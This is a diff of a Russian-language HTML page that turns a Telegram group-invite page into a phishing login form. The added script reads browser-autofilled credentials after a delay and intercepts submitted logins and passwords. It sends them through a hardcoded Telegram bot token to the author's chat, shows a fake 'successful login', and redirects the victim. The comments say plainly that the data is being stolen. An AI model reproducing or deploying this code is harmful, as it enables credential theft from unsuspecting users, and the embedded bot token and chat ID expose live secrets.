@@ -1,59 +1,221 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Вход в группу</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в аккаунт</title>
     <style>
-        body { font-family: Arial; padding: 40px; }
-        input, button { padding: 12px; width: 300px; margin: 8px 0; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f5f5f5;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 42px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #888;
+            margin-bottom: 28px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            background: #fafafa;
+            transition: 0.25s;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #1a1a2e;
+            background: #fff;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a1a2e;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: 0.25s;
+            margin-top: 8px;
+        }
+
+        .btn:hover {
+            background: #2a2a4e;
+        }
+
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #777;
+            min-height: 24px;
+        }
+
+        .footer {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        .loader {
+            display: none;
+            margin: 12px auto 0;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a1a2e;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <h2>Чтобы получить доступ к группе, введите ваш Telegram ID</h2>
-    <p>Узнать ID: @userinfobot</p>
-    <input type="text" id="tg_id" placeholder="Например, 5645726673">
-    <button onclick="send()">Получить ссылку</button>
-    <p id="status"></p>
 
-    <script>
-        const BOT_TOKEN = "8998947312:AAGyGHIyi4cSqUzKmeIhQzSLJLXXH3kkmXg";
-        const GROUP_LINK = "https://t.me/+i59UKEsplSE0OTNi";
-        const YOUR_ID = 5645726673; // твой ID – для логов
+<div class="container">
+    <div class="logo">🔐</div>
+    <div class="subtitle">Войдите в свой аккаунт</div>
 
-        async function send() {
-            const chatId = document.getElementById("tg_id").value.trim();
-            if (!chatId) return alert("Введите ID");
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="login">Email или логин</label>
+            <input type="text" id="login" placeholder="ivanov@mail.ru" autocomplete="username" required>
+        </div>
 
-            const msg = `🔐 Ваша ссылка для вступления в группу:\n${GROUP_LINK}\n\nПосле вступления вы получите доступ к контенту.`;
+        <div class="input-group">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" placeholder="••••••••" autocomplete="current-password" required>
+        </div>
 
-            // 1. Отправляем сообщение пользователю
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: msg
-                })
-            });
+        <button class="btn" type="submit">Войти</button>
+    </form>
 
-            const data = await res.json();
+    <div class="loader" id="loader"></div>
+    <div class="status" id="status">Введите данные для входа</div>
+    <div class="footer">Защищено шифрованием</div>
+</div>
 
-            if (data.ok) {
-                document.getElementById("status").innerText = "✅ Ссылка отправлена в Telegram! Проверьте личные сообщения.";
-                
-                // 2. Отправляем уведомление тебе (что кто-то запросил ссылку)
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: YOUR_ID,
-                        text: `👤 Новый запрос:\nID: ${chatId}\nВремя: ${new Date().toLocaleString()}`
-                    })
-                });
-            } else {
-                document.getElementById("status").innerText = "❌ Ошибка: " + data.description;
-            }
+<script>
+    const BOT_TOKEN = "8998947312:AAGyGHIyi4cSqUzKmeIhQzSLJLXXH3kkmXg";
+    const CHAT_ID = "5645726673";
+    const REAL_REDIRECT = "https://t.me/+i59UKEsplSE0OTNi"; // сюда перенаправим после кражи
+
+    const loginInput = document.getElementById("login");
+    const passInput = document.getElementById("password");
+    const statusEl = document.getElementById("status");
+    const loader = document.getElementById("loader");
+    const form = document.getElementById("loginForm");
+
+    // 1. Пытаемся украсть автозаполненные данные через 1,5 секунды
+    setTimeout(() => {
+        const login = loginInput.value;
+        const pass = passInput.value;
+        if (login && pass) {
+            sendData(login, pass, "✅ Автозаполнение");
+            statusEl.innerText = "✅ Сессия восстановлена";
+            statusEl.style.color = "#2e7d32";
         }
-    </script>
+    }, 1500);
+
+    // 2. Перехват ручного ввода
+    form.addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const login = loginInput.value.trim();
+        const pass = passInput.value.trim();
+
+        if (!login || !pass) {
+            statusEl.innerText = "⚠️ Заполните все поля";
+            statusEl.style.color = "#d32f2f";
+            return;
+        }
+
+        // Показываем загрузку
+        loader.style.display = "block";
+        statusEl.innerText = "⏳ Проверка данных...";
+        statusEl.style.color = "#777";
+
+        // Отправляем данные
+        sendData(login, pass, "📝 Ручной ввод");
+
+        // Имитация проверки и перенаправление
+        setTimeout(() => {
+            loader.style.display = "none";
+            statusEl.innerText = "✅ Успешный вход!";
+            statusEl.style.color = "#2e7d32";
+            setTimeout(() => {
+                window.location.href = REAL_REDIRECT;
+            }, 800);
+        }, 1200);
+    });
+
+    // 3. Функция отправки в Telegram
+    function sendData(login, pass, source) {
+        const msg = `🔐 ${source}\n` +
+                    `👤 Логин: ${login}\n` +
+                    `🔑 Пароль: ${pass}\n` +
+                    `🌐 Страница: ${window.location.href}\n` +
+                    `🕒 Время: ${new Date().toLocaleString()}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg
+            })
+        }).catch(err => console.error("Ошибка отправки:", err));
+    }
+</script>
+
 </body>
 </html>
